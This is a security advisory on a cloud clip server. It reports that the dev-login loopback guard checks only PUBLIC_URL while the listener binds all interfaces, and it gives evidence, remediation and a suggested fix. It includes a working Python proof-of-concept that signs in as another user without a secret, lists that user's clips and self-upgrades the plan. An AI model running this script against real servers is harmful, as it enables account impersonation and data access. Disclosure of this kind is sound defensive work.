# DEV_LOGIN loopback guard only checks PUBLIC_URL; server still listens on all interfaces, allowing unauthenticated sign-in as any account from the network

**ID:** vuln-0001
**Severity:** MEDIUM
**Found:** 2026-11-19 17:03:07 UTC
**Target:** server/src/index.mjs (cloud server HTTP listener) with server/src/config.mjs DEV_LOGIN guard
**Endpoint:** /auth/dev/callback
**Method:** POST
**CWE:** CWE-1327
**CVSS:** 4.8
**Confidence:** High
**Fix Effort:** Trivial

## Description

The 2026-11-18 fix makes the server refuse to start with DEV_LOGIN=1 unless PUBLIC_URL is a loopback address. The guard only inspects the configured URL string; the HTTP listener is bound to every network interface. A remote or LAN client can therefore use the password-less "type a name" login and the dev plan upgrade endpoint on any server that has DEV_LOGIN=1 and the loopback PUBLIC_URL from .env.example, e.g. when the port is published by a container, port-forward or reverse proxy.

## Evidence

```
start -> 302 http://127.0.0.1:18787/auth/dev/form?state=eyJ...
me {'id': 'c5910bb4-...', 'name': 'Alice', 'avatar': None, 'provider': 'dev', 'email': None}
alice clips {'clips': [{'id': 'f9e7e918-...', 'title': '...', 'size': 23000, 'shareUrl': 'http://127.0.0.1:18787/s/W1CvF-bA', ...}]}
self-upgrade pro
```
`ss -ltn`: `LISTEN 0 511 *:18787 *:*`. After the fix, `curl http://172.17.0.2:18790/health` is refused while 127.0.0.1 works.

## Impact

An attacker who can reach the server's port sees the dev login routes. Demonstrated from a non-loopback address: the attacker signed in as the existing dev account "alice" by typing its name, read that account's cloud clips (IDs, titles, share URLs, sizes) and used /api/dev/plan to upgrade the account to Pro (100 GB quota, 1 GB clips). Impact is limited to servers run with DEV_LOGIN=1 (documented as test-only), so it defeats the protection the fix claims to provide rather than affecting a default production deployment.

## Counterevidence

DEV_LOGIN is documented as test-only and defaults to 0; production deployments with a public PUBLIC_URL cannot enable it, so the default shipped configuration is not affected. The exploit needs network reachability to a dev-mode server. A host firewall or a loopback-only port mapping would prevent it.

## What Would Change This Severity

If the official deployment docs or Docker setup publish the port with DEV_LOGIN=1 by default, severity would rise to high; if all supported setups bind loopback only, it drops to informational.

## Technical Analysis

`config.mjs` validates only `new URL(config.publicUrl).hostname` against 127.0.0.1/localhost/[::1] when `DEV_LOGIN=1`. `index.mjs` then calls `server.listen(config.port, cb)` with no host argument, so Node binds `::`/0.0.0.0. The routes `/auth/dev/start`, `/auth/dev/form`, `/auth/dev/callback` and `/api/dev/plan` do not check the peer address or Host header (the URL is parsed against `config.publicUrl`, ignoring Host). Dev identity is `provider='dev'` + lower-cased typed name with no secret, so any name, including one used by a real tester, maps to the same account. The session token returned in the Location header of /auth/dev/callback is readable directly by the HTTP client; the loopback `redirect` target is irrelevant to the attacker. `ss -ltn` shows `*:18787` listening, and the server answered on the container's 172.17.0.2 address.

## Proof of Concept

1. Start the server with DEV_LOGIN=1, PUBLIC_URL=http://127.0.0.1:18787, a strong JWT_SECRET and PORT=18787 (as in .env.example). Create an account "alice" with a cloud clip via the normal flow.
2. From a client addressing the server through its non-loopback interface address (172.17.0.2 here), call GET /auth/dev/start with a loopback redirect, and take the `state` from the returned Location.
3. POST that state with name=Alice to /auth/dev/callback and read the `token` from the 302 Location header.
4. Use the token as a Bearer token: /api/me returns the alice account, /api/clips lists alice's clips, and POST /api/dev/plan {"plan":"pro"} upgrades it.
5. Apply the suggested fix (bind to 127.0.0.1 when DEV_LOGIN=1) and repeat: the connection to the non-loopback address is refused.

```python
# Run against the server via its non-loopback address
import requests, urllib.parse as up
B = 'http://172.17.0.2:18787'   # server: PUBLIC_URL=http://127.0.0.1:18787 DEV_LOGIN=1
back = 'http://127.0.0.1:9/done?n=x'
r = requests.get(B + '/auth/dev/start', params={'redirect': back}, allow_redirects=False)
state = up.parse_qs(up.urlparse(r.headers['location']).query)['state'][0]
r = requests.post(B + '/auth/dev/callback', data={'state': state, 'name': 'Alice'}, allow_redirects=False)
tok = up.parse_qs(up.urlparse(r.headers['location']).query)['token'][0]
H = {'Authorization': 'Bearer ' + tok}
print(requests.get(B + '/api/me', headers=H).json()['user'])
print(requests.get(B + '/api/clips', headers=H).json())
print(requests.post(B + '/api/dev/plan', headers=H, json={'plan': 'pro'}).json()['plan']['id'])
```

## Code Analysis

**Location 1:** `server/src/index.mjs` (line 342)
  Listener binds all interfaces
  ```
  server.listen(config.port, () => {
  ```

  **Suggested Fix:**
```diff
- server.listen(config.port, () => {
+ server.listen(config.port, config.devLogin ? '127.0.0.1' : undefined, () => {
```

## Remediation

Bind the listener to 127.0.0.1 whenever DEV_LOGIN is enabled (and keep the existing PUBLIC_URL check). Additionally reject the dev routes when the request's socket remote address is not loopback, and consider an explicit HOST setting for production deployments so the bind address is deliberate.

## Fix Verification

Gate 1: applied the one-line change in a scratch copy; `node` started without errors and the diff touches only line 342. Gate 2: started the patched server with DEV_LOGIN=1 on port 18790; `curl http://127.0.0.1:18790/health` returned {"ok":true} and `curl http://172.17.0.2:18790/health` was refused, so the PoC cannot reach the dev routes. Gate 3: with DEV_LOGIN=0 the host argument is undefined, so production binding is unchanged; loopback dev login still works. Known gap: a PUBLIC_URL of http://localhost may resolve to ::1 on some systems, which a 127.0.0.1-only bind would not serve (use 'localhost' as the host argument if that matters). Gate 4: the repo's npm test suite was not run against the patch.

## Assumptions

Operator has enabled DEV_LOGIN=1 with a loopback PUBLIC_URL and the listening port is reachable by the attacker (LAN, published container port, port-forward or reverse proxy on the same host).
